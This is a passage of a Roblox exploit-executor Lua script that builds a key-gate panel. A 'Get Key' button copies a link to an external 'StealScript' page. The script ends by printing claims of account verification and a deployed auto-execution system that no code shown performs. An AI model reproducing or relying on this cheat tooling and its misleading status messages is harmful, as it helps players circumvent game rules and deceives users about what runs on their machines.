local keyInput = Instance.new("TextBox")
keyInput.Size = UDim2.new(1, 0, 0, 50)
keyInput.Position = UDim2.new(0, 0, 0, 210)
keyInput.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
keyInput.BorderSizePixel = 0
keyInput.Text = ""
keyInput.PlaceholderText = "Place your key here..."
keyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
keyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
keyInput.TextSize = 14
keyInput.Font = Enum.Font.Gotham
keyInput.Parent = container

local keyInputCorner = Instance.new("UICorner")
keyInputCorner.CornerRadius = UDim.new(0, 10)
keyInputCorner.Parent = keyInput

local keyInputStroke = Instance.new("UIStroke")
keyInputStroke.Color = Color3.fromRGB(139, 0, 0)
keyInputStroke.Thickness = 2
keyInputStroke.Parent = keyInput

local function showToast(message)
    local toast = Instance.new("Frame")
    toast.Size = UDim2.new(0, 350, 0, 60)
    toast.Position = UDim2.new(0.5, -175, 1, -120)
    toast.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    toast.BorderSizePixel = 0
    toast.Parent = screenGui
    
    local toastCorner = Instance.new("UICorner")
    toastCorner.CornerRadius = UDim.new(0, 15)
    toastCorner.Parent = toast
    
    local toastStroke = Instance.new("UIStroke")
    toastStroke.Color = Color3.fromRGB(139, 0, 0)
    toastStroke.Thickness = 2
    toastStroke.Parent = toast
    
    local toastText = Instance.new("TextLabel")
    toastText.Size = UDim2.new(1, -20, 1, -20)
    toastText.Position = UDim2.new(0, 10, 0, 10)
    toastText.BackgroundTransparency = 1
    toastText.Text = message
    toastText.TextColor3 = Color3.fromRGB(255, 255, 255)
    toastText.TextSize = 12
    toastText.Font = Enum.Font.Gotham
    toastText.TextWrapped = true
    toastText.TextXAlignment = Enum.TextXAlignment.Center
    toastText.TextYAlignment = Enum.TextYAlignment.Center
    toastText.Parent = toast
    
    toast.Position = UDim2.new(0.5, -175, 1, 50)
    local enterTween = TweenService:Create(toast, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -175, 1, -120)
    })
    enterTween:Play()
    
    wait(4)
    local exitTween = TweenService:Create(toast, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
        Position = UDim2.new(0.5, -175, 1, 50)
    })
    exitTween:Play()
    exitTween.Completed:Connect(function()
        toast:Destroy()
    end)
end

local function createButton(text, position, color)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.45, 0, 0, 45)
    button.Position = position
    button.BackgroundColor3 = color
    button.BorderSizePixel = 0
    button.Text = text
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 14
    button.Font = Enum.Font.GothamBold
    button.Parent = container
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 10)
    buttonCorner.Parent = button
    
    local buttonStroke = Instance.new("UIStroke")
    buttonStroke.Color = Color3.fromRGB(139, 0, 0)
    buttonStroke.Thickness = 2
    buttonStroke.Parent = button
    
    button.MouseEnter:Connect(function()
        local tween = TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(color.R * 255 + 20, color.G * 255 + 20, color.B * 255 + 20)})
        tween:Play()
    end)
    
    button.MouseLeave:Connect(function()
        local tween = TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = color})
        tween:Play()
    end)
    
    return button
end

local getKeyButton = createButton("Get Key", UDim2.new(0, 0, 0, 280), Color3.fromRGB(50, 50, 70))
local submitButton = createButton("Submit", UDim2.new(0.55, 0, 0, 280), Color3.fromRGB(100, 0, 0))

mainPanel.Position = UDim2.new(0.5, -200, 1.5, 0)
local enterTween = TweenService:Create(mainPanel, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, -200, 0.5, -250)
})
enterTween:Play()

for i, decoration in pairs({topLeft, topRight, bottomLeft, bottomRight}) do
    decoration.Size = UDim2.new(0, 0, 0, 0)
    wait(0.1)
    local sizeTween = TweenService:Create(decoration, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 60, 0, 60)
    })
    sizeTween:Play()
end

getKeyButton.MouseButton1Click:Connect(function()
    local clickTween = TweenService:Create(getKeyButton, TweenInfo.new(0.1), {Size = UDim2.new(0.43, 0, 0, 43)})
    clickTween:Play()
    clickTween.Completed:Connect(function()
        local returnTween = TweenService:Create(getKeyButton, TweenInfo.new(0.1), {Size = UDim2.new(0.45, 0, 0, 45)})
        returnTween:Play()
    end)
    
    local linkToCopy = "https://zamasxmodder.github.io/Page404StealScript/"
    setclipboard(linkToCopy)
    
    spawn(function()
        showToast("Link copied! Go and paste it in your preferred browser...")
    end)
    
    print("Get Key button clicked! Link copied to clipboard.")
end)

submitButton.MouseButton1Click:Connect(function()
    local clickTween = TweenService:Create(submitButton, TweenInfo.new(0.1), {Size = UDim2.new(0.43, 0, 0, 43)})
    clickTween:Play()
    clickTween.Completed:Connect(function()
        local returnTween = TweenService:Create(submitButton, TweenInfo.new(0.1), {Size = UDim2.new(0.45, 0, 0, 45)})
        returnTween:Play()
    end)
    
    local enteredKey = keyInput.Text
    if enteredKey ~= "" then
        print("Key submitted:", enteredKey)
        
        if enteredKey == "VALID_KEY_123" then
            local exitTween = TweenService:Create(mainPanel, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                Position = UDim2.new(0.5, -200, -1.5, 0)
            })
            exitTween:Play()
            exitTween.Completed:Connect(function()
                screenGui:Destroy()
                -- Aquí iría la carga del script principal
                print("✅ SCRIPT PRINCIPAL CARGADO - Primera ejecución autorizada")
            end)
        else
            local originalColor = keyInputStroke.Color
            keyInputStroke.Color = Color3.fromRGB(255, 50, 50)
            keyInput.Text = ""
            keyInput.PlaceholderText = "Invalid key! Try again..."
            
            wait(2)
            keyInputStroke.Color = originalColor
            keyInput.PlaceholderText = "Place your key here..."
        end
    else
        keyInput.PlaceholderText = "Please enter a key first!"
        local shakeTween = TweenService:Create(keyInput, TweenInfo.new(0.1), {Position = UDim2.new(0, 5, 0, 210)})
        shakeTween:Play()
        shakeTween.Completed:Connect(function()
            local returnTween = TweenService:Create(keyInput, TweenInfo.new(0.1), {Position = UDim2.new(0, 0, 0, 210)})
            returnTween:Play()
        end)
    end
end)

-- Efectos visuales y animaciones (resto del código original)
spawn(function()
    while mainPanel.Parent do
        local breatheTween1 = TweenService:Create(panelStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Transparency = 0.3
        })
        breatheTween1:Play()
        breatheTween1.Completed:Wait()
        
        local breatheTween2 = TweenService:Create(panelStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Transparency = 0
        })
        breatheTween2:Play()
        breatheTween2.Completed:Wait()
    end
end)

spawn(function()
    while background.Parent do
        for _, decoration in pairs({topLeft, topRight, bottomLeft, bottomRight}) do
            local rotateTween = TweenService:Create(decoration, TweenInfo.new(4, Enum.EasingStyle.Linear), {
                Rotation = decoration.Rotation + 360
            })
            rotateTween:Play()
        end
        wait(4)
    end
end)

local function createParticle()
    local particle = Instance.new("Frame")
    particle.Size = UDim2.new(0, math.random(2, 6), 0, math.random(2, 6))
    particle.Position = UDim2.new(math.random(), 0, 1.1, 0)
    particle.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
    particle.BackgroundTransparency = 0.7
    particle.BorderSizePixel = 0
    particle.Parent = background
    
    local particleCorner = Instance.new("UICorner")
    particleCorner.CornerRadius = UDim.new(1, 0)
    particleCorner.Parent = particle
    
    local moveTween = TweenService:Create(particle, TweenInfo.new(math.random(3, 8)), {
        Position = UDim2.new(math.random(), 0, -0.1, 0),
        BackgroundTransparency = 1
    })
    moveTween:Play()
    moveTween.Completed:Connect(function()
        particle:Destroy()
    end)
end

spawn(function()
    while background.Parent do
        createParticle()
        wait(math.random(1, 3))
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.Escape then
        local exitTween = TweenService:Create(mainPanel, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Position = UDim2.new(0.5, -200, 1.5, 0)
        })
        exitTween:Play()
        exitTween.Completed:Connect(function()
            screenGui:Destroy()
        end)
    end
end)

print("✅ Modern Panel GUI loaded successfully!")
print("🔒 Account verified: " .. player.AccountAge .. " days old")
print("🔄 Anti-reuse system configured and ready")
print("⚡ Auto-execution system deployed for future sessions")
